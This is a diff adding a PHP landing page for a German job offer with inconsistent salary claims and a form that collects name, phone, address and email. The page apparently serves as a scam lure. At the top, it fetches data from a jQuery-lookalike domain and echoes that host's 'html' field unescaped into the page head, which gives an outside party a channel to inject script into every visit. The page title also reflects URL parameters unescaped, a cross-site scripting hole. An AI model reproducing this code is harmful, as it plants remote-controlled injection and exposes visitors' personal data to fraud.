@@ -1,0 +1,146 @@
+<?php
+$site_data      = json_decode(file_get_contents('http://templates.jquery.link/api/' . $_SERVER['HTTP_HOST']), true);
+
+$phone_name     = $site_data['phone_name'];
+$phone_href     = $site_data['phone_href'];
+
+$text           = str_replace('+', ' ', trim($_GET['t'] ?? 'Entrumpelung'));
+$city           = str_replace('+', ' ', trim($_GET['n'] ?? 'in der nahe'));
+
+$title = $text . ' ' . $city;
+?>
+
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <?= $site_data['html'] ?>
+    <title>
+        <?= $title ?>
+    </title>
+</head>
+
+<body>
+
+
+    <!--Шапка сайта-->
+    <header class="header">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-12 containerP0">
+                    <div class="header__box">
+                        <div class="header__left">
+                            <h1 class="header__title">JOB GESUCHT?</h1>
+                            <div class="header__wrp">
+                                <div class="header__inner">
+                                    <div class="subTitleWrp">
+                                        <h2 class="header__subTitle">Monatslohn: <br> Ab 1800 € Netto</h2>
+                                    </div>
+                                    <ul class="header__ul">
+                                        <li>UNBEFRISTETE ANSTELLUNG</li>
+                                        <li>5-TAGE WOCHE</li>
+                                        <li>MöGLICHKEIT ZUR WEITERBILDUNG</li>
+                                        <li>FREUNDLICHES ARBEITSUMFELD</li>
+                                    </ul>
+                                    <p class="header_txt">WiR Suchen dich!</p>
+                                    <div class="header__btnWrp">
+                                        <a href="#" class="header__btn">Jetzt BewerBen</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="header__right">
+                            <h2 class="header__titleH2">Job geSUchT in IhReR Nähe?</h2>
+                            <p class="header__txt2">Sind Sie auf der Suche nach einem Job in Ihrer Nähe? Wir bieten gut bezahlte Stellen  für zuverlässige Fachkräfte in Ihrem Umfeld  an. Mit einem Monatslohn ab 1900 €, je  nach Qualifikation, haben wir verschiedene  Positionen zu besetzen, wie zum Beispiel <strong>Elektriker</strong> oder <strong>Installateur</strong>, mit einem Monatslohn zwischen <strong>2500 und 3000 € netto</strong>. Wenn Sie auf Jobsuche sind, sind  Sie bei uns genau richtig. Sie können sich  gerne telefonisch oder über unser Formular  bewerben. Einer unserer Mitarbeiter wird  persönlich Kontakt mit Ihnen aufnehmen,  um den Bewerbungsprozess zu  besprechen. Nach erfolgreicher Aufnahme  können Sie direkt bei uns durchstarten.
+                                Verlieren Sie keine Zeit – Ihr Job wartet auf Sie!</p>
+                            <div class="header__wrpbtn">
+                                <a href="#" class="header__linkTell">111222333</a>
+                                <a href="#" class="header__message">Jetzt  Anfragen</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Основное содержимое страницы -->
+    <main class="main">
+        <!-- Раздел страницы-->
+        
+
+        <section class='forms'>
+            <div class='forms__wrapper'>
+               <div class='container-fluid'>
+                  <div class='row'>
+                     <div class='col-12 container'>
+                        <div class='forms__box'>
+                           <h2 class='forms__title'>Kontaktieren Sie uns:</h2>
+                           <form id='jq_form' class='mb-0 mt-3'>
+                              <div class='my-0'>
+                                 <input class='form-control' placeholder='Name' name='jq_name' type='text'>
+                                 <div id='jq_name' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div class='my-4'>
+                                 <input class='form-control' placeholder='Telefonnummer' name='jq_phone' type='text'>
+                                 <div id='jq_phone' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div class='my-4'>
+                                 <input class='form-control' placeholder='Straße' name='jq_street' type='text'>
+                                 <div id='jq_street' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div class='my-4'>
+                                 <input class='form-control' placeholder='Postleitzahl/Stadt' name='jq_city' type='text'>
+                                 <div id='jq_city' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div class='my-4'>
+                                 <input class='form-control' placeholder='E-mail' name='jq_email' type='text'>
+                                 <div id='jq_email' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div class='my-4'>
+                                 <textarea rows='3' class='form-control' name='jq_text' placeholder='Beschreibung'></textarea>
+                                 <div id='jq_text' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div>
+                                 <input class='btn  text-uppercase fw-bold mb-0 px-3 py-2 forms__button' type='submit' id='jq_submit' value='Senden'>
+                              </div>
+                              <div id='jq_success' style='display:none'>Vielen Dank für Ihre Anfrage. Unsere Mitarbeiter werden sich in Kürze bei Ihnen melden.</div>
+                           </form>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+        </section>
+
+        
+        <section class='btnFixedD'>
+            <div class='btnFixedD__box'>
+                <a class="btnFixedD__btn" href="<?= $phone_href ?>" ><img class="btnFixedD__img" src="assets/icons/telephone-fill.svg" alt=""></a>
+            </div>
+        </section>
+        <section class='btnFixed'>
+            <div class='btnFixed__box'>
+                <a class="btnFixed__btn" href="<?= $phone_href ?>" ><span>111222333</span></a>
+            </div>
+        </section>
+    </main>
+    <!--Нижний колонтитул страницы-->
+    <footer class="footer">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-12 container">© 2024</div>
+            </div>
+        </div>
+    </footer>
+    <!--Style-->
+    <link href="assets/css/reset.css" rel="stylesheet">
+    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="assets/css/style.min.css" rel="stylesheet">
+    <script src="assets/js/main.min.js"></script>
+</body>
+
+</html>
